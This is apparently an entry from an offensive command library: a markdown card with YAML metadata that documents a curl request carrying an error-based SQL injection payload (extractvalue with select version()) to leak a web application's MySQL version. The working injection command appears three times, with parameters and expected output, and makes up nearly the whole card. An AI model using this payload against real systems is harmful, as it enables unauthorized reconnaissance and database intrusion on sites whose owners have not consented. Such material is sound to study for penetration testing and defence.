---
id: cmd-uuid-002
name: curl-leak-version
type: command
executor: bash
data: >-
  curl -X GET
  "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa"
  -H "Host: target.com" -H "User-Agent: Mozilla/5.0"
output: Error message revealing MySQL version 8.0.23
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.488Z'
platforms:
  - Linux
  - Web
tags:
  - sqli
  - curl
verified: false
validated: true
submitted: true
---

# curl-leak-version

## Command

```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa" -H "Host: target.com" -H "User-Agent: Mozilla/5.0"
```

## Description

Injects payload to leak MySQL version.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Method | Yes |
| URL | Payload path | Yes |
| `-H Host` | Target host | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa"
```

## Expected Output

Error with version 8.0.23 in syntax error.

## Related

- [[Related Procedure: Leak-MySQL-Version-via-SQL-Injection]]
